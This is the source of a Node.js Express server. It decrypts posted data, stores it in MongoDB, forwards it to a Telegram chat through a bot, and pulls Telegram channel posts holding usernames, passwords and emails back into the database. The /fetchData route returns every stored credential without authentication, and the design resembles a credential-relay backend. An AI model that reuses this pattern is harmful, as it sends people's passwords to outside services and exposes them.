const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = 8080;
const CryptoJS = require("crypto-js");
const { MongoClient } = require("mongodb");

require("dotenv").config();

const SECRET_KEY = process.env.SECRET_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_BOT_TOKEN_2 = process.env.TELEGRAM_BOT_TOKEN_2;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const url = process.env.MONGODB_URI;

const client = new MongoClient(`${url}`, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = client.db("EttyDB");
const collection = db.collection("test");

app.use(bodyParser.json());
app.use(express.static("public")); // Serve static files from the "public" directory

app.post("/storeData", async (req, res) => {
  try {
    const encryptedData = req.body.data;

    // Decrypt data
    const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
    const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

    // Construct message for Telegram
    const message = JSON.stringify(decryptedData);

    // MongoDB
    await client.connect();
    console.log("Connected successfully to server");

    const insertResult = await collection.insertOne({
      chat_id: TELEGRAM_CHAT_ID,
      text_id: decryptedData[0]["id"],
      text: decryptedData,
    });

    // Send message to Telegram
    const telegramApiUrl2 = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`;
    const response = await fetch(telegramApiUrl2, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      throw new Error("Failed to send message to Telegram");
    }
  } catch (error) {
    console.error("Error storing data:", error);
    res.status(500).send("Failed to store data");
  } finally {
    await client.close();
    console.log("Server closed");
  }
});

app.get("/fetchData", async (req, res) => {
  try {
    await client.connect();
    console.log("Connected successfully to server");

    const resultDict = {};
    const findResult = collection.find({ chat_id: TELEGRAM_CHAT_ID });
    await findResult.forEach((doc) => {
      const text_id = doc.text_id;
      if (!resultDict[text_id]) {
        resultDict[text_id] = {};
      }
      doc.text.forEach((item) => {
        resultDict[text_id][item.type] = item.value;
      });
    });

    console.log("Filtered entries:", resultDict);
    res.status(200).json(resultDict);
  } catch (error) {
    console.error("Error fetching data from Telegram:", error);
    res.status(500).send("Failed to fetch data from Telegram");
  } finally {
    client.close();
    console.log("Server closed");
  }
});

app.get("/editData", async (req, res) => {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
  try {
    const fetch = await import("node-fetch");
    const response = await fetch.default(telegramApiUrl, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      throw new Error("Failed to fetch data from Telegram");
    }

    const data = await response.json();
    console.log("Raw data from Telegram:", data);

    const messages = data.result
      .filter(
        (update) =>
          (update.channel_post && update.channel_post.text) ||
          (update.edited_channel_post && update.edited_channel_post.text)
      )
      .map((update) => {
        if (update.channel_post) {
          return update.channel_post.text;
        } else if (update.edited_channel_post) {
          return update.edited_channel_post.text;
        }
      })
      .filter((text) => {
        try {
          JSON.parse(text);
          return true;
        } catch (e) {
          return false;
        }
      });

    console.log("Filtered messages:", messages);

    const entries = messages.reduce((acc, message) => {
      const data = JSON.parse(message);
      data.forEach((item) => {
        if (!acc[item.id]) {
          acc[item.id] = {};
        }
        acc[item.id][item.type] = item.value;
      });
      return acc;
    }, {});

    console.log("Processed entries:", entries);

    await client.connect();
    console.log("Connected successfully to server");

    async function insertEntries(entries) {
      const documents = [];

      for (const [text_id, entry] of Object.entries(entries)) {
        const document = {
          chat_id: entry.chatid,
          text_id: text_id,
          text: [
            { id: text_id, type: "username", value: entry.username },
            { id: text_id, type: "password", value: entry.password },
            { id: text_id, type: "email", value: entry.email },
            { id: text_id, type: "chatid", value: entry.chatid },
          ],
        };
        documents.push(document);
      }

      const insertResult = await collection.insertMany(documents);
      return insertResult;
    }

    const insertResult = await insertEntries(entries);

    res.status(200).json(entries);
  } catch (error) {
    console.error("Error fetching data from Telegram:", error);
    res.status(500).send("Failed to fetch data from Telegram");
  } finally {
    await client.close();
    console.log("Server closed");
  }
});

async function reloadData() {
  const editDataUrl = "http://localhost:8080/editData";
  const fetchDataUrl = "http://localhost:8080/fetchData";

  // Fetch editData
  const editDataResponse = await fetch(editDataUrl, { method: "GET" });
  if (!editDataResponse.ok) {
    throw new Error("Failed to reload editData");
  }

  // Fetch fetchData
  const fetchDataResponse = await fetch(fetchDataUrl, { method: "GET" });
  if (!fetchDataResponse.ok) {
    throw new Error("Failed to reload fetchData");
  }

  return true;
}

// Serve the test.html file after reloading data
app.get("/", async (req, res) => {
  try {
    await reloadData();
    res.sendFile(__dirname + "/public/test.html");
  } catch (error) {
    console.error("Error reloading data before serving test.html:", error);
    res.status(500).send("Failed to load test.html");
  }
});

app.listen(port, () => {
  console.log(`Backend server running at http://localhost:${port}`);
});
